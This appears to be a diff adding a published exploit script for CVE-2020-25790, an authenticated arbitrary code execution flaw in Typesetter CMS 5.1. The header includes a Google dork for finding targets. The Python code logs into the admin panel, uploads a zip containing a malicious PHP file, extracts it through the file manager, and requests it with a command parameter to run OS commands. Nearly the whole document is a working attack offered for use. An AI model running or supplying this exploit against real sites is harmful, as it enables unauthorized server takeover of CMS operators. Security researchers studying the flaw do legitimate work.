@@ -1,0 +1,211 @@
+# Exploit Title: Typesetter CMS 5.1 - Arbitrary Code Execution
+# Exploit Author: Rodolfo "t0gu" Tavares
+# Contact: @t0guu (TW)
+# Software Homepage: https://www.typesettercms.com/
+# Version : 5.1
+# Tested on: Linux / Apache
+# Category: WebApp
+# Google Dork: intext:"Powered by Typesetter"
+# Date: 2020-09-29
+# CVE : CVE-2020-25790
+
+######## Description ########
+#
+# The CMS Typesetter has functionality (web interface) where it is possible
+# through an account with privileges to perform uploads. Through this
+# functionality, it is possible to upload a .zip file that contains a
+# malicious .php file. In the same functionality, there is also the
+# possibility to extract the file through the same web interface, the
+# attacker only needs to extract the .zip that was previously loaded and
+# click on the malicious .php file to execute commands in the operating
+# system.
+#
+
+######## Exploit with Poc ########
+
+
+https://github.com/t0gu/CVE-2020-25790
+
+####### Code #######
+
+
+# see the poc at https://github.com/t0gu/CVE-2020-25790
+
+import argparse
+from bs4 import BeautifulSoup
+import requests
+import sys
+import  re
+
+
+import urllib3
+from urllib3.exceptions import InsecureRequestWarning
+
+banner = """ 
+
+ 
+ ██████╗██╗   ██╗███████╗    ██████╗  ██████╗ ██████╗  ██████╗       ██████╗ ███████╗███████╗ █████╗  ██████╗ 
+██╔════╝██║   ██║██╔════╝    ╚════██╗██╔═████╗╚════██╗██╔═████╗      ╚════██╗██╔════╝╚════██║██╔══██╗██╔═████╗
+██║     ██║   ██║█████╗█████╗ █████╔╝██║██╔██║ █████╔╝██║██╔██║█████╗ █████╔╝███████╗    ██╔╝╚██████║██║██╔██║
+██║     ╚██╗ ██╔╝██╔══╝╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ████╔╝██║╚════╝██╔═══╝ ╚════██║   ██╔╝  ╚═══██║████╔╝██║
+╚██████╗ ╚████╔╝ ███████╗    ███████╗╚██████╔╝███████╗╚██████╔╝      ███████╗███████║   ██║   █████╔╝╚██████╔╝
+ ╚═════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝ ╚══════╝ ╚═════╝       ╚══════╝╚══════╝   ╚═╝   ╚════╝  ╚═════╝ 
+                                                                                                                                                                                                                    
+by: t0gu
+
+
+usage: main.py [-h] -p PASSWORD -l LOGIN -u URL
+
+==> Exploit for CVE 2020-25790
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -p PASSWORD, --password PASSWORD
+                        ==> admin password
+  -l LOGIN, --login LOGIN
+                        ==> admin login
+  -u URL, --url URL     ==> main URL
+
+  """
+
+print(banner)
+menu = argparse.ArgumentParser(description="==> Exploit for CVE 2020-25790")
+menu.add_argument("-p", "--password", required=True, help="==> admin password")
+menu.add_argument("-l", "--login", required=True, help="==> admin login")
+menu.add_argument("-u", "--url", required=True, help="==> main URL")
+menu.add_argument("-f", "--file", required=True, help="==> Malicous zip file with php file inside")
+args = menu.parse_args()
+
+login = args.login
+password = args.password
+url = args.url
+file = args.file
+
+
+PROXIES = proxies = {
+    "http": "http://127.0.0.1:8080",
+    "https": "https://127.0.0.1:8080",
+}
+
+
+class Exploit:
+
+    def __init__(self, login, password, url, file):
+        self.login = login
+        self.password = password
+        self.url = url
+        self.user_agent = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari"
+        self.file = open(file, 'rb')
+
+    def get_nounce(self):
+        try:
+            url = self.url + "/Admin"
+            r = requests.get(url=url, headers={'User-Agent': self.user_agent}, timeout=3, verify=False)
+            data = r.text
+            soap_obj = BeautifulSoup(data, 'html.parser')
+            for inp in soap_obj.find_all("input"):
+                for v in inp:
+                    nounce = v['value']
+                    if nounce != None or nounce != "":
+                        return nounce
+        except (requests.exceptions.BaseHTTPError, requests.exceptions.Timeout) as e:
+            print(f'==> Error {e}')
+
+    def get_hash_folders(self):
+
+        cookie_auth = self.get_cookies()
+        hash_verified = self.get_verified()
+        data_post = {'verified': hash_verified, 'cmd': 'open', 'target':'', 'init': 1, 'tree': 1}
+        try:
+            url = self.url + "/Admin_Finder"
+            r = requests.post(url=url, data=data_post, headers={'User-Agent': self.user_agent, 'Cookie': cookie_auth}, timeout=10, verify=False)
+            json_data = r.json()
+            hash_dir = json_data['files'][2]['hash']
+            return hash_dir
+        except (requests.exceptions.BaseHTTPError, requests.exceptions.Timeout) as e:
+            print(f'==> Error {e}')
+
+    def get_cookies(self):
+
+        nounce = self.get_nounce()
+        if nounce:
+            try:
+                url = self.url + "/Admin"
+                data_post = {'file': '', 'cmd': 'login', 'login_nonce': nounce, 'username': self.login, 'user_sha': '',
+                             'password': self.password, 'pass_md5': '', 'pass_sha': '', 'pass_sha512': '',
+                             'remember': 'on', 'verified': ''}
+                r = requests.post(url=url, verify=False, timeout=3, data=data_post, allow_redirects=False,
+                                  headers={'User-Agent': self.user_agent, 'Cookie': 'g=2'})
+                cookie_admin = r.headers['Set-Cookie']
+                cookie_name = cookie_admin.split(':')[0].split('=')[0]
+                cookie_value = cookie_admin.split(':')[0].split('=')[1].split(';')[0]
+
+                if cookie_name == None or cookie_name == "":
+                    if cookie_value == None or cookie_value == "":
+                        print("==> Something went wrong while login")
+                else:
+                    data = f"{cookie_name}={cookie_value};"
+                    return data
+            except (requests.exceptions.Timeout, requests.exceptions.BaseHTTPError) as e:
+                print(f'==> Error while login {e}')
+
+    def upload_zip(self):
+        url = self.url + '/Admin_Finder'
+        hash_verified = self.get_verified()
+        hash_dir = self.get_hash_folders()
+        auth_cookie = self.get_cookies()
+
+        try:
+            print(f"==> Uploading file: {self.file}")
+            data = {'cmd': "upload", "target": hash_dir, "verified": hash_verified}
+            r = requests.post(url=url, verify=False, timeout=10,
+                              headers={'User-Agent': self.user_agent, 'Cookie': auth_cookie}, data=data, files={'upload[]': self.file})
+            hash_file = r.json()['added'][0]['hash']
+            self.extract_file(auth_cookie, hash_file, hash_verified)
+        except (requests.exceptions.HTTPError, requests.exceptions.Timeout) as e:
+            print(f"==> Error while uploading {e}")
+
+
+    def extract_file(self, auth_cookie, hash_file, hash_verified):
+        data_post={'verified': hash_verified, 'cmd': 'extract', 'target': hash_file}
+        try:
+            url = self.url + "/Admin_Finder"
+            r = requests.post(url=url, data=data_post, headers={'User-Agent': self.user_agent, 'Cookie': auth_cookie}, timeout=10, verify=False)
+            name_file = r.json()['added'][0]['name']
+            print(f"==> All Hashes are collected from: {name_file}") 
+            self.xpl(auth_cookie,name_file)
+        except (requests.exceptions.BaseHTTPError, requests.exceptions.Timeout) as e:
+            print(f'==> Error {e}')
+
+
+    def xpl(self, auth_cookie, name_file):
+        try:
+            url = self.url + "/data/_uploaded/file/" + name_file + "?cmd=id"
+            new_url = url.replace("index.php", "")
+            print(f"==> Try to exploit: {new_url}")
+            r = requests.get(url=new_url, headers={'User-Agent': self.user_agent, 'Cookie': auth_cookie}, timeout=10, verify=False)
+            pattern = r'<pre>(.*?)</pre>'
+            m = re.search(pattern, r.text.replace("\n", ""))
+            if m is not None and m != "":
+                print(f"==> Vulnerable: {m.group(1)}")
+        except (requests.exceptions.BaseHTTPError, requests.exceptions.Timeout) as e:
+            print(f'==> Error {e}')
+
+
+    def get_verified(self):
+        try:
+            url = self.url + "/Admin/Uploaded"
+            auth_cookie = self.get_cookies()
+            r = requests.get(url=url, headers={'User-Agent': self.user_agent, 'Cookie': auth_cookie}, timeout=10, verify=False)
+            data = r.text
+            pattern_regex = r'"verified":"(.*)"}'
+            m = re.search(pattern_regex, data)
+            if m is not None or m != "":
+                return m.group(1)
+
+        except (requests.exceptions.BaseHTTPError, requests.exceptions.Timeout) as e:
+            print(f'==> Error {e}')
+
+if __name__ == "__main__":
+    obj = Exploit(login, password, url, file)
+    obj.upload_zip()
